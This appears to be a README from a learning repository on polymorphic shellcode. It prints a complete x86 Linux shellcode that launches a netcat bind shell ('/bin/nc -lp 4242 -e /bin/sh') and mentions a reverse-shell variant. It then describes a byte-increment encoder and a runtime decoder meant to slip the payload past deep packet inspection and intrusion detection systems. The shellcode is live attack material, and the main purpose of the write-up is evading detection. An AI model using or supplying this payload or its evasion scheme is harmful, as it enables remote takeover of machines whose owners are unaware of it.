# A netcat polymorphic shellcode

# A netcat shellcode

`netcat.asm` is a program that starts a netcat shell (0.0.0.0:4242). We can have a reverse shell by providing netcat an ip like `netcat myip 4242 -e /bin/sh`.


The program `get_opcodes.sh` allows us to retrieve opcodes related to our object files :
```
$> ./get_opcodes netcat.o
\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x30\x2d\x6c\x70\x34\x32\x34\x32\x30\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x30\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44

Length: 91
```
It also gives us the length of the payload.

We can use this payload as this in our exploit ... BUT ... It can easily be detected on the network by any software that does DPI, any good IDS for example.
On the last bytes of payload, we can easily read the string `/bin/nc0-lp42420-e/bin/sh0AAAABBBBCCCCDDDD` which is very suspect.

# Polymorphism ?

The idea is to encode the actual netcat payload and provide some code with it to decode it when it will be running.

The structure is the following :
```
+---------+---------+
| DECODER | PAYLOAD |
+---------+---------+
```

I decided to add 1 to each by of the payload as an encoding poc. The decoder will decrement each byte of the encoded payload at runtime so it can be interpreted again.

# The encoder (encode_sub.c)

Source file is commented.
It returns the encoded payload plus its length.

# The decoder (decode_sub.asm)

Source file is commented
We can get opcodes with `./get_opcodes.sh decode_sub.o`

# PoC (test_polymorphism)

Decoder and encoded shellcode are concatenated and called.
